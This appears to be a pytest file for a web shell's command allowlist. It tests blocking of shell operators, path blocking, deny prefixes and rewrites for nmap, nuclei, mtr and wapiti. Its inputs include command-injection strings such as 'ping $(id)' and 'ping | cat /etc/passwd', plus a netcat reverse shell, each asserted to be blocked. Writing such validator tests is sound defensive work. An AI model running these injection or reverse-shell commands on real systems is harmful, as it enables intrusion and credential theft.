"""
Tests for command validation and rewrite logic in app.py.

These tests cover the security-critical path: shell operator blocking, path
blocking, allowlist prefix matching, deny prefix (!), and command rewrites.
Run with: pytest app/tests/ (from the repo root)
"""

import sys
import os
import unittest.mock as mock

# conftest.py chdirs to app/ before this runs, so app.py can be imported cleanly
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
import app as shell_app


# ── Helpers ───────────────────────────────────────────────────────────────────

ALLOW = ["ping", "nmap", "dig", "curl", "mtr", "traceroute", "nuclei", "wapiti"]
DENY  = []


def _check(cmd, allow=None, deny=None):
    """Call is_command_allowed with a mocked allowlist."""
    a = allow if allow is not None else ALLOW
    d = deny  if deny  is not None else DENY
    with mock.patch("app.load_allowed_commands", return_value=(a, d)):
        return shell_app.is_command_allowed(cmd)


# ── Shell operator blocking ────────────────────────────────────────────────────

class TestShellOperators:
    def test_pipe(self):
        ok, _ = _check("ping | cat /etc/passwd")
        assert not ok

    def test_double_ampersand(self):
        ok, _ = _check("ping google.com && id")
        assert not ok

    def test_semicolon(self):
        ok, _ = _check("ping google.com ; id")
        assert not ok

    def test_double_pipe(self):
        ok, _ = _check("ping google.com || id")
        assert not ok

    def test_backtick(self):
        ok, _ = _check("ping `id`")
        assert not ok

    def test_dollar_subshell(self):
        ok, _ = _check("ping $(id)")
        assert not ok

    def test_redirect_out(self):
        ok, _ = _check("ping google.com > /etc/passwd")
        assert not ok

    def test_redirect_append(self):
        ok, _ = _check("ping google.com >> /tmp/x")
        assert not ok

    def test_redirect_in(self):
        ok, _ = _check("curl example.com < /etc/passwd")
        assert not ok


# ── Path blocking ─────────────────────────────────────────────────────────────

class TestPathBlocking:
    def test_data_path(self):
        ok, _ = _check("curl /data/history.db")
        assert not ok

    def test_tmp_path(self):
        ok, _ = _check("curl /tmp/secret")
        assert not ok

    def test_url_with_data_segment(self):
        # URLs like https://example.com/data/file should NOT be blocked
        ok, _ = _check("curl https://example.com/data/file")
        assert ok

    def test_url_with_tmp_segment(self):
        ok, _ = _check("curl https://example.com/tmp/thing")
        assert ok


# ── Allowlist prefix matching ─────────────────────────────────────────────────

class TestAllowlist:
    def test_exact_match(self):
        ok, _ = _check("ping")
        assert ok

    def test_prefix_with_args(self):
        ok, _ = _check("ping -c 4 google.com")
        assert ok

    def test_not_in_list(self):
        ok, _ = _check("nc -e /bin/sh 10.0.0.1 4444")
        assert not ok

    def test_prefix_must_have_space(self):
        # "pingreally" should NOT match the "ping" prefix
        ok, _ = _check("pingreally google.com")
        assert not ok

    def test_unrestricted_when_no_file(self):
        with mock.patch("app.load_allowed_commands", return_value=(None, [])):
            ok, _ = shell_app.is_command_allowed("anything goes")
        assert ok

    def test_case_insensitive(self):
        ok, _ = _check("PING google.com")
        assert ok


# ── Deny prefix (!) ───────────────────────────────────────────────────────────

class TestDenyPrefix:
    def test_deny_takes_priority(self):
        # load_allowed_commands lowercases entries; pass pre-lowercased values in mock
        ok, _ = _check("nmap -sU 10.0.0.1", allow=["nmap"], deny=["nmap -su"])
        assert not ok

    def test_allow_still_works_without_denied_flag(self):
        ok, _ = _check("nmap -sT 10.0.0.1", allow=["nmap"], deny=["nmap -su"])
        assert ok

    def test_deny_exact_match(self):
        ok, _ = _check("nmap -sU", allow=["nmap"], deny=["nmap -su"])
        assert not ok

    def test_deny_prefix_with_more_args(self):
        # "nmap --script vuln 10.0.0.1" should be denied if "nmap --script" is in deny list
        ok, _ = _check("nmap --script vuln 10.0.0.1", allow=["nmap"], deny=["nmap --script"])
        assert not ok

    def test_empty_deny_list_has_no_effect(self):
        ok, _ = _check("nmap -sV 10.0.0.1", allow=["nmap"], deny=[])
        assert ok


# ── Command rewrites ──────────────────────────────────────────────────────────

class TestRewrites:
    def test_mtr_adds_report_wide(self):
        cmd, notice = shell_app.rewrite_command("mtr google.com")
        assert "--report-wide" in cmd
        assert notice is not None

    def test_mtr_no_rewrite_if_report_flag_present(self):
        cmd, notice = shell_app.rewrite_command("mtr --report google.com")
        assert "--report-wide" not in cmd
        assert notice is None

    def test_mtr_no_rewrite_if_report_wide_present(self):
        cmd, notice = shell_app.rewrite_command("mtr --report-wide google.com")
        assert cmd.count("--report-wide") == 1  # not doubled
        assert notice is None

    def test_mtr_short_flag_no_rewrite(self):
        cmd, notice = shell_app.rewrite_command("mtr -r google.com")
        assert "--report-wide" not in cmd
        assert notice is None

    def test_nmap_adds_privileged(self):
        cmd, notice = shell_app.rewrite_command("nmap -sV 10.0.0.1")
        assert "--privileged" in cmd
        assert notice is None  # silent rewrite

    def test_nmap_no_double_privileged(self):
        cmd, _ = shell_app.rewrite_command("nmap --privileged -sV 10.0.0.1")
        assert cmd.count("--privileged") == 1

    def test_nuclei_adds_template_dir(self):
        cmd, notice = shell_app.rewrite_command("nuclei -u https://example.com")
        assert "-ud /tmp/nuclei-templates" in cmd
        assert notice is None

    def test_nuclei_no_rewrite_if_ud_present(self):
        cmd, _ = shell_app.rewrite_command("nuclei -ud /tmp/my-templates -u https://example.com")
        assert cmd.count("-ud") == 1

    def test_wapiti_adds_stdout_redirect(self):
        cmd, notice = shell_app.rewrite_command("wapiti http://example.com")
        assert "-f txt" in cmd
        assert "/dev/stdout" in cmd
        assert notice is not None

    def test_wapiti_no_rewrite_if_output_set(self):
        cmd, notice = shell_app.rewrite_command("wapiti http://example.com -o /tmp/report.txt")
        assert "/dev/stdout" not in cmd
        assert notice is None

    def test_no_rewrite_for_other_commands(self):
        cmd, notice = shell_app.rewrite_command("dig google.com")
        assert cmd == "dig google.com"
        assert notice is None
